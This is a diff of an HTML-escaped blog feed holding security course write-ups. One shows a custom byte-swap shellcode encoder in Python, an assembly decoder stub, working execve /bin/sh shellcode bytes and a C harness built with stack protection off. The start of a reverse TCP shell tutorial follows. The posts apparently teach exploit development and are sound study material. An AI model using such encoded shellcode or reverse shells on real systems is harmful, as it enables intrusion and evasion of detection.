-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s2"&gt;x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
 
 
-&lt;span class="n"&gt;script_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;script_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Error: invalid number of arguments&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Usage:&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;{} SHELLCODE&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;script_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; 
-    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Example:&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;{} &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;aa&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;bb&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;cc&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;dd&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;script_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Error: invalid number of arguments&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Usage:&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s2"&gt;{} SHELLCODE&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;script_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; 
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Example:&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s2"&gt;{} &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s2"&gt;aa&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s2"&gt;bb&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s2"&gt;cc&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s2"&gt;dd&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;script_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
     &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
 &lt;span class="n"&gt;cleartext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;unhexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
@@ -1336,23 +1336,23 @@ Payload: &amp;quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cleartext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
     &lt;span class="n"&gt;cleartext&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
-&lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
 &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cleartext&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;cleartext&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;cleartext&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;ENCRYPTED OUTPUT:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Standard:  {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;NASM:      {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hexlify_nasm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ENCRYPTED OUTPUT:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Standard:  {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;NASM:      {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hexlify_nasm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Let's encode the main payload:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;./xchgencoder &lt;span class="s2"&gt;&amp;quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./xchgencoder &lt;span class="s2"&gt;&amp;quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output (formatted to fit the screen):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;ENCRYPTED OUTPUT:
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ENCRYPTED OUTPUT:
 Standard:  \xc0\x31\x68\x50\x2f\x6e\x68\x73\x2f\x68\x62\x2f\x89\x69\x31\xe3\x31
 \xc9\xb0\xd2\xcd\x0b\x90\x80
 NASM:      0xc0,0x31,0x68,0x50,0x2f,0x6e,0x68,0x73,0x2f,0x68,0x62,0x2f,0x89,0x69,
@@ -1361,21 +1361,21 @@ NASM:      0xc0,0x31,0x68,0x50,0x2f,0x6e,0x68,0x73,0x2f,0x68,0x62,0x2f,0x89,0x69
 
 
 &lt;p&gt;After the encoded payload was ready all I needed to do was write the decoder stub in Assembly. The decoding stub first decodes the main payload and then jumps the execution to where the payload begins:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;section&lt;/span&gt; &lt;span class="no"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;section&lt;/span&gt; &lt;span class="no"&gt;.text&lt;/span&gt;
     &lt;span class="nf"&gt;global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
     &lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="no"&gt;.data&lt;/span&gt;
 &lt;span class="nl"&gt;.code:&lt;/span&gt;
-    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="no"&gt;esi&lt;/span&gt;             &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;Point&lt;/span&gt; &lt;span class="no"&gt;ESI&lt;/span&gt; &lt;span class="no"&gt;to&lt;/span&gt; &lt;span class="no"&gt;the&lt;/span&gt; &lt;span class="no"&gt;beginning&lt;/span&gt; &lt;span class="no"&gt;of&lt;/span&gt; &lt;span class="no"&gt;the&lt;/span&gt; &lt;span class="no"&gt;shellcode&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;shellcode_len&lt;/span&gt;  &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;Put&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;shellcode&lt;/span&gt; &lt;span class="no"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="no"&gt;into&lt;/span&gt; &lt;span class="no"&gt;ECX&lt;/span&gt;
-    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="no"&gt;esi&lt;/span&gt;             &lt;span class="c"&gt;; Point ESI to the beginning of the shellcode&lt;/span&gt;
+    &lt;span class="no"&gt;push&lt;/span&gt; &lt;span class="no"&gt;shellcode_len&lt;/span&gt;  &lt;span class="c"&gt;; Put (shellcode length)/2 into ECX&lt;/span&gt;
+    &lt;span class="no"&gt;pop&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;
     &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
 &lt;span class="nl"&gt;.decrypt:&lt;/span&gt;
-    &lt;span class="nf"&gt;lodsw&lt;/span&gt;            &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;load&lt;/span&gt; &lt;span class="no"&gt;two&lt;/span&gt; &lt;span class="no"&gt;shellcode&lt;/span&gt; &lt;span class="no"&gt;bytes&lt;/span&gt; &lt;span class="no"&gt;into&lt;/span&gt; &lt;span class="no"&gt;EAX&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esi-1&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;  &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;and&lt;/span&gt; &lt;span class="no"&gt;switch&lt;/span&gt; &lt;span class="no"&gt;them&lt;/span&gt;
-    &lt;span class="nf"&gt;shr&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esi-2&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;
+    &lt;span class="nf"&gt;lodsw&lt;/span&gt;            &lt;span class="c"&gt;; load two shellcode bytes into EAX&lt;/span&gt;
+    &lt;span class="no"&gt;mov&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esi-1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;  &lt;span class="c"&gt;; and switch them&lt;/span&gt;
+    &lt;span class="no"&gt;shr&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esi-2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;
     &lt;span class="nf"&gt;loop&lt;/span&gt; &lt;span class="no"&gt;.decrypt&lt;/span&gt;    
     &lt;span class="no"&gt;jmp&lt;/span&gt; &lt;span class="no"&gt;shellcode&lt;/span&gt;
 
@@ -1389,13 +1389,13 @@ NASM:      0xc0,0x31,0x68,0x50,0x2f,0x6e,0x68,0x73,0x2f,0x68,0x62,0x2f,0x89,0x69
 
 &lt;p&gt;In the above code to make the long shellcode fit the screen and keep the code executable (in case you are copy-pasting), I divided it into two parts with the second titled &lt;em&gt;sc_continued&lt;/em&gt;. In the actual source code it is just one long line of comma separated bytes titled &lt;em&gt;shellcode&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;It's time to build another binary and extract the resulting shellcode:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf xchgdecoder.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o xchgdecoder xchgdecoder.o
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nasm -f elf xchgdecoder.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o xchgdecoder xchgdecoder.o
 scdump xchgdecoder
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;Length:  52
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Length:  52
 Payload: &amp;quot;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff\xc1\xe8\x08\x88&amp;quot;
 &amp;quot;\x46\xfe\xe2\xf3\xeb\x05\xe8\xe6\xff\xff\xff\xc0\x31\x68\x50\x2f\x6e\x68\x73&amp;quot;
 &amp;quot;\x2f\x68\x62\x2f\x89\x69\x31\xe3\x31\xc9\xb0\xd2\xcd\x0b\x90\x80&amp;quot;
@@ -1404,8 +1404,8 @@ Payload: &amp;quot;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff\xc1\xe8\
 
 &lt;p&gt;Remember that if you try to run the &lt;code&gt;./xchgdecoder&lt;/code&gt; by itself you'll get segmentation fault as soon as your stub decoder tries to overwrite the first byte of the encrypted payload. Overwriting executable code of the &lt;em&gt;.text&lt;/em&gt; section is prohibited by design and you can do nothing about it.&lt;/p&gt;
 &lt;p&gt;To test that the whole encoding business is actually working we'll need the help of a C language. Here is the source code that tests our shellcode:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 
 &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc1\xe8\x08\x88\x46\xfe\xe2\xf3\xeb\x05\xe8\xe6\xff\xff\xff\xc0\x31\x68\x50\x2f&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
@@ -1423,12 +1423,12 @@ Payload: &amp;quot;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff\xc1\xe8\
 
 
 &lt;p&gt;And that's how we build a binary out of it and run the result:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;gcc -fno-stack-protector -z execstack -o scframe scframe.c
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gcc -fno-stack-protector -z execstack -o scframe scframe.c
 ./scframe
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="Working encoded shellcode" src="http://www.wryway.com/blog/assembly-custom-encoding-scheme/working-encoded-shellcode.png" title="Working encoded shellcode" /&gt;
+&lt;p&gt;&lt;img alt="Working encoded shellcode" src="http://www.wryway.com/blog/assembly-custom-encoding-scheme/working-encoded-shellcode.png" title="Working encoded shellcode"&gt;
 &lt;div class="img-caption"&gt;It works!&lt;/div&gt;&lt;/p&gt;
 &lt;div class="divider"&gt;&lt;/div&gt;
 
@@ -1440,13 +1440,13 @@ Payload: &amp;quot;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff\xc1\xe8\
 
 &lt;p&gt;&lt;hr&gt;
 This blog post was created to fulfill the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
-&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Creating TCP reverse shell shellcode (SLAE, Assignment #2)</title><link href="http://www.wryway.com/blog/creating-tcp-reverse-shell-shellcode/" rel="alternate"></link><updated>2015-10-05T21:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-05:blog/creating-tcp-reverse-shell-shellcode/</id><summary type="html">&lt;p&gt;I remember when I was first introduced to the concept of the reverse shell it was a bit difficult to wrap my mind around it. The reverse shell is called so because instead of attacker connecting to the victim machine, the victim machine initiates a connection to the attacking machine. The shell-throwing direction is reversed in this case. Reverse shell's main purpose is to circumvent firewalls that blindly allow outgoing traffic without proper filtering. &lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</content><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Creating TCP reverse shell shellcode (SLAE, Assignment #2)</title><link href="http://www.wryway.com/blog/creating-tcp-reverse-shell-shellcode/" rel="alternate"></link><published>2015-10-05T21:00:00-04:00</published><updated>2015-10-05T21:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-05:/blog/creating-tcp-reverse-shell-shellcode/</id><summary type="html">&lt;p&gt;Demonstation of reverse TCP shell shellcode creation&lt;/p&gt;</summary><content type="html">&lt;p&gt;I remember when I was first introduced to the concept of the reverse shell it was a bit difficult to wrap my mind around it. The reverse shell is called so because instead of attacker connecting to the victim machine, the victim machine initiates a connection to the attacking machine. The shell-throwing direction is reversed in this case. Reverse shell's main purpose is to circumvent firewalls that blindly allow outgoing traffic without proper filtering. &lt;/p&gt;
 &lt;p&gt;It turned out that the code for the reverse shell is actually simpler than that of the &lt;a href="/blog/building-tcp-bind-shell-shellcode/"&gt;bind TCP shell&lt;/a&gt; I wrote about in a previous post. It is also shorter. &lt;/p&gt;
 &lt;p&gt;Here is the prototype C program that we will base our Assembly code on. Code is pretty simple, but nevertheless I furnished it with comments:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;strings.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;strings.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 
 &lt;span class="cp"&gt;#define ADDR &amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;
